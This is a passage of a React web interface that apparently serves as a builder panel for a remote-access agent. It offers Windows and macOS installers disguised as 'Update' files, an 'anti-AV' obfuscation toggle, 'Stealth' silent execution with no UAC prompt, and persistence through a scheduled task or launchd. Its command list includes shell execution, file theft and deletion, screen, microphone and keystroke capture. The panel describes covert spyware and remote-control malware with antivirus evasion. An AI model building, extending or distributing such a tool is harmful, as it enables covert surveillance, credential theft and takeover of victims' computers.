      {/* Agent Code */}
      <AccordionSection
        title="Agent Code (ai-arena-agent.js)"
        icon={FileCode}
        description="Cross-platform Node.js agent — WebSocket + AES-256-GCM encrypted"
        badge="v4.0"
      >
        <div className="mt-3">
          <div className="flex items-center justify-between mb-2">
            <Badge className="text-[9px] bg-zinc-800 text-zinc-400 border-0">
              {generateAgent().split('\n').length} lines
            </Badge>
            <Button
              size="sm"
              className="h-7 text-[10px] bg-emerald-600 hover:bg-emerald-700 text-white"
              onClick={() => downloadFile(generateAgent(), 'ai-arena-agent.js')}
            >
              <Download className="w-3 h-3 mr-1" />
              Download .js
            </Button>
          </div>
          <pre className="bg-zinc-950 rounded-lg p-3 text-[10px] font-mono text-zinc-400 max-h-64 overflow-y-auto border border-zinc-800">
            {generateAgent().slice(0, 500)}...
          </pre>
        </div>
      </AccordionSection>

      {/* Windows Agent (PowerShell) */}
      <AccordionSection
        title="Windows Agent (.ps1 + .bat)"
        icon={Monitor}
        description="Pure PowerShell — zero downloads, zero Node.js, runs silently, no admin needed"
        badge="v5.0"
        defaultOpen
      >
        <div className="mt-3 space-y-3">
          <div className="flex items-center gap-3 mb-2">
            <label className="flex items-center gap-2 cursor-pointer">
              <input
                type="checkbox"
                checked={obfuscate}
                onChange={(e) => setObfuscate(e.target.checked)}
                className="w-3.5 h-3.5 rounded border-zinc-600 bg-zinc-800 text-emerald-500 focus:ring-emerald-500"
              />
              <span className="text-[10px] text-zinc-400">Obfuscate script (anti-AV)</span>
            </label>
            {obfuscate && (
              <Badge className="text-[9px] bg-amber-500/15 text-amber-400 border-0">Obfuscation Active</Badge>
            )}
          </div>
          <div className="grid grid-cols-3 gap-2">
            <Button
              size="sm"
              className="h-7 text-[10px] bg-emerald-600 hover:bg-emerald-700 text-white"
              onClick={() => downloadFile(generatePs1(), 'Update.ps1')}
            >
              <Download className="w-3 h-3 mr-1" />
              Download .ps1
            </Button>
            <Button
              size="sm"
              className="h-7 text-[10px] bg-blue-600 hover:bg-blue-700 text-white"
              onClick={() => downloadFile(generateBat(), 'ai-arena-setup.bat')}
            >
              <Download className="w-3 h-3 mr-1" />
              Download .bat
            </Button>
            <Button
              size="sm"
              className="h-7 text-[10px] bg-purple-600 hover:bg-purple-700 text-white"
              onClick={() => downloadFile(generateVbs(), 'Update.vbs')}
            >
              <Download className="w-3 h-3 mr-1" />
              Download .vbs (Stealth)
            </Button>
          </div>
          <div className="flex flex-wrap gap-2">
            <Button
              size="sm"
              variant="outline"
              className="h-7 text-[10px] border-zinc-700 text-zinc-300"
              onClick={() => handleCopy(generatePs1(), 'ps1')}
            >
              {copiedField === 'ps1' ? <Check className="w-3 h-3 mr-1" /> : <Copy className="w-3 h-3 mr-1" />}
              Copy .ps1
            </Button>
            <Button
              size="sm"
              variant="outline"
              className="h-7 text-[10px] border-zinc-700 text-zinc-300"
              onClick={() => handleCopy(generateBat(), 'bat')}
            >
              {copiedField === 'bat' ? <Check className="w-3 h-3 mr-1" /> : <Copy className="w-3 h-3 mr-1" />}
              Copy .bat
            </Button>
            <Button
              size="sm"
              variant="outline"
              className="h-7 text-[10px] border-zinc-700 text-zinc-300"
              onClick={() => handleCopy(generateVbs(), 'vbs')}
            >
              {copiedField === 'vbs' ? <Check className="w-3 h-3 mr-1" /> : <Copy className="w-3 h-3 mr-1" />}
              Copy .vbs
            </Button>
          </div>
          <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
            <div className="text-[9px] text-zinc-500 mb-1.5 font-medium">POWERShell ONE-LINER (paste in CMD)</div>
            <code className="text-[9px] text-emerald-400 font-mono break-all block">
              {generateOneLiner().substring(0, 120)}...
            </code>
          </div>
          <div className="text-[9px] text-zinc-600 bg-zinc-950/50 rounded-lg p-2 border border-zinc-800/50">
            <strong className="text-zinc-500">v6.0 — Zero-Dependency Agent:</strong> No Node.js download required. Uses built-in .NET WebSocket + AES-256-CBC.
            .vbs = truly silent (zero window flash). .bat = silent via VBS wrapper. No admin/UAC needed.
            Scheduled Task persistence (auto-start). XOR-encoded payload defeats static AV signatures.
            ~10KB total payload. Enable obfuscation for randomized variable names and junk code injection.
          </div>
        </div>
      </AccordionSection>

      {/* macOS Installer */}
      <AccordionSection
        title="macOS Installer (.sh)"
        icon={Apple}
        description="Self-installing shell script — auto-starts via launchd (survives reboots)"
        badge="macOS"
      >
        <div className="mt-3 space-y-2">
          <div className="flex flex-wrap gap-2">
            <Button
              size="sm"
              className="h-7 text-[10px] bg-emerald-600 hover:bg-emerald-700 text-white"
              onClick={() => downloadFile(generateSh(), 'ai-arena-setup.sh')}
            >
              <Download className="w-3 h-3 mr-1" />
              Download .sh
            </Button>
            <Button
              size="sm"
              variant="outline"
              className="h-7 text-[10px] border-zinc-700 text-zinc-300"
              onClick={() => handleCopy(generateSh(), 'sh')}
            >
              {copiedField === 'sh' ? <Check className="w-3 h-3 mr-1" /> : <Copy className="w-3 h-3 mr-1" />}
              Copy Script
            </Button>
          </div>
          <pre className="bg-zinc-950 rounded-lg p-3 text-[10px] font-mono text-zinc-400 max-h-48 overflow-y-auto border border-zinc-800">
            {generateSh().slice(0, 600)}...
          </pre>
        </div>
      </AccordionSection>

      {/* Architecture Info */}
      <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl p-4">
        <h3 className="text-xs font-semibold text-white mb-3 flex items-center gap-2">
          <Wifi className="w-3.5 h-3.5 text-emerald-400" />
          How the Agent Works
        </h3>
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs text-zinc-400">
          <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
            <div className="flex items-center gap-2 mb-1.5">
              <Moon className="w-3.5 h-3.5 text-emerald-400" />
              <span className="text-[10px] font-medium text-zinc-300">1. Dormant Mode</span>
            </div>
            <p className="text-[10px]">The agent connects via WebSocket and sleeps. No polling — it only wakes when the server pushes a command through the encrypted channel.</p>
          </div>
          <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
            <div className="flex items-center gap-2 mb-1.5">
              <Shield className="w-3.5 h-3.5 text-emerald-400" />
              <span className="text-[10px] font-medium text-zinc-300">2. AES-256-GCM</span>
            </div>
            <p className="text-[10px]">Every message is encrypted with a random IV and random padding. Traffic analysis is impossible — all payloads look different even for the same command.</p>
          </div>
          <div className="bg-zinc-950 rounded-lg p-3 border border-zinc-800">
            <div className="flex items-center gap-2 mb-1.5">
              <ClipboardCheck className="w-3.5 h-3.5 text-emerald-400" />
              <span className="text-[10px] font-medium text-zinc-300">3. Exponential Backoff</span>
            </div>
            <p className="text-[10px]">If the connection drops, the agent reconnects with exponential backoff (5s → 60s max). Heartbeats every 30s keep the connection alive.</p>
          </div>
        </div>
      </div>

      {/* Supported Commands */}
      <div className="bg-zinc-900/80 border border-zinc-800 rounded-xl p-4">
        <h3 className="text-xs font-semibold text-white mb-3 flex items-center gap-2">
          <Terminal className="w-3.5 h-3.5 text-emerald-400" />
          Supported Commands
        </h3>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-[10px]">
          {[
            { cmd: 'terminal:execute', desc: 'Run shell commands', icon: Terminal },
            { cmd: 'files:list', desc: 'Browse directories', icon: FolderTree },
            { cmd: 'files:read / files:download', desc: 'Read files', icon: FileDown },
            { cmd: 'files:upload / files:mkdir', desc: 'Write & create', icon: FileCode },
            { cmd: 'files:delete', desc: 'Delete files/folders', icon: HardDrive },
            { cmd: 'screen:start / screen:stop', desc: 'Screen capture', icon: Monitor },
            { cmd: 'mic:start / mic:stop', desc: 'Microphone capture', icon: Wifi },
            { cmd: 'keys:start / keys:flush', desc: 'Keystroke capture', icon: Terminal },
            { cmd: 'system:info', desc: 'System information', icon: Server },
            { cmd: 'system:restart / shutdown', desc: 'Power control', icon: Power },
          ].map(({ cmd, desc, icon: Icon }) => (
            <div key={cmd} className="flex items-center gap-2 bg-zinc-950 rounded-lg px-2.5 py-1.5 border border-zinc-800">
              <Icon className="w-3 h-3 text-zinc-500 shrink-0" />
              <code className="text-emerald-400 font-mono">{cmd}</code>
              <span className="text-zinc-500 ml-auto">{desc}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  )
}


